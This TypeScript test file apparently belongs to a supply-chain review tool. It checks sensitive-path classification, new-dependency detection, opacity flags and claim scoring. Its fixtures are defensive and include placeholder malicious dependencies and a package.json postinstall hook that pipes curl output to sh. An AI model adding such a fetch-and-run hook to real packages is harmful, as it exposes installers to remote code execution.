// SPDX-License-Identifier: GPL-3.0-or-later
import { test } from "node:test";
import assert from "node:assert/strict";
import { sensitiveCategory, newDependencies, opacityIssue, computeScores } from "../src/metrics.ts";
import { layoutTreemap } from "../src/html.ts";
import type { ClaimResult, DiffFile, FileInsight, RiskFlag } from "../src/types.ts";

test("sensitiveCategory classifies by priority", () => {
  assert.equal(sensitiveCategory("Cargo.toml"), "dependencies");
  assert.equal(sensitiveCategory(".github/workflows/release.yml"), "ci/build");
  assert.equal(sensitiveCategory("docker/Dockerfile.debian"), "ci/build");
  assert.equal(sensitiveCategory("src/auth/session.rs"), "auth/crypto");
  assert.equal(sensitiveCategory("src/api/icons.rs"), null);
  assert.equal(sensitiveCategory("README.md"), null);
});

function file(path: string, patch: string): DiffFile {
  const additions = patch.split("\n").filter((l) => l.startsWith("+")).length;
  return { path, status: "modified", additions, deletions: 0, patch };
}

test("newDependencies finds added deps, ignores version bumps and lockfiles", () => {
  const added = file(
    "Cargo.toml",
    '@@ -1,2 +1,3 @@\n serde = "1.0"\n+sneaky-crate = "0.1.3"\n',
  );
  assert.deepEqual(newDependencies(added), ["sneaky-crate"]);

  const bumped = file("Cargo.toml", '@@ -1,1 +1,1 @@\n-serde = "1.0.1"\n+serde = "1.0.2"\n');
  assert.deepEqual(newDependencies(bumped), []);

  const lock = file("Cargo.lock", '@@ -1,1 +1,2 @@\n+name = "whatever"\n');
  assert.deepEqual(newDependencies(lock), []);

  // go.mod bumps use "name vX.Y.Z" (no = or :) — must not read as new.
  const goBump = file(
    "go.mod",
    "@@ -22,1 +22,1 @@ require (\n-\tgithub.com/klauspost/compress v1.18.4\n+\tgithub.com/klauspost/compress v1.18.6\n",
  );
  assert.deepEqual(newDependencies(goBump), []);

  const goNew = file("go.mod", "@@ -22,0 +23,1 @@ require (\n+\tgithub.com/evil/backdoor v1.0.0\n");
  assert.deepEqual(newDependencies(goNew), ["github.com/evil/backdoor"]);

  const pkg = file("package.json", '@@ -5,1 +5,2 @@\n   "dependencies": {\n+    "evil-pkg": "^2.0.0",\n');
  assert.deepEqual(newDependencies(pkg), ["evil-pkg"]);
});

test("opacityIssue flags binaries, minified blobs and install hooks", () => {
  assert.equal(
    opacityIssue({ path: "vendor/blob.so", status: "added", additions: 0, deletions: 0 }),
    "binary file",
  );
  assert.equal(
    opacityIssue({ path: "logo.png", status: "added", additions: 0, deletions: 0 }),
    null,
  );
  assert.equal(
    opacityIssue(file("dist/app.js", "@@ -0,0 +1,1 @@\n+" + "x".repeat(900))),
    "minified content",
  );
  assert.equal(
    opacityIssue(file("package.json", '@@ -3,1 +3,2 @@\n+  "postinstall": "curl x | sh",\n')),
    "install hook changed",
  );
});

function result(verdict: ClaimResult["verdict"], generated = false): ClaimResult {
  return {
    claim: { id: 0, section: "s", text: "t", kind: "change", prNumbers: [], shas: [], advisories: [], codeSpans: [] },
    verdict,
    confidence: 1,
    evidence: { commitShas: [], files: [], matchedTerms: [], methods: ["none"] },
    reasoning: "",
    judged: false,
    generated,
  };
}

test("computeScores caps overall on contradicted claims and critical flags", () => {
  const clean = computeScores([result("verified"), result("verified")], 1, []);
  assert.equal(clean.overall >= 85, true);
  assert.equal(clean.label, "solid");

  const contradicted = computeScores([result("verified"), result("contradicted")], 1, []);
  assert.ok(contradicted.overall <= 35, `expected cap, got ${contradicted.overall}`);
  assert.equal(contradicted.label, "suspicious");

  const critical: RiskFlag = { severity: "critical", kind: "x", message: "m", files: [], commitShas: [] };
  const flagged = computeScores([result("verified")], 1, [critical]);
  assert.ok(flagged.overall <= 45);
});

test("computeScores down-weights auto-generated entries", () => {
  // 1 failing handwritten claim among 3 verified generated ones must hurt more
  // than the raw 3/4 average.
  const s = computeScores(
    [result("verified", true), result("verified", true), result("verified", true), result("no-evidence")],
    1,
    [],
  );
  assert.ok(s.correctness < 50, `expected heavy penalty, got ${s.correctness}`);
});

test("layoutTreemap fills the viewport and preserves area proportions", () => {
  const files: FileInsight[] = [
    { path: "a", churn: 600, sensitive: null, coverage: "evidence" },
    { path: "b", churn: 300, sensitive: null, coverage: "covered" },
    { path: "c", churn: 100, sensitive: null, coverage: "undocumented" },
  ];
  const rects = layoutTreemap(files, 1000, 500);
  assert.equal(rects.length, 3);
  const total = rects.reduce((s, r) => s + r.w * r.h, 0);
  assert.ok(Math.abs(total - 500_000) < 1, `area sum ${total}`);
  const a = rects.find((r) => r.file.path === "a")!;
  assert.ok(Math.abs(a.w * a.h - 300_000) < 1);
});
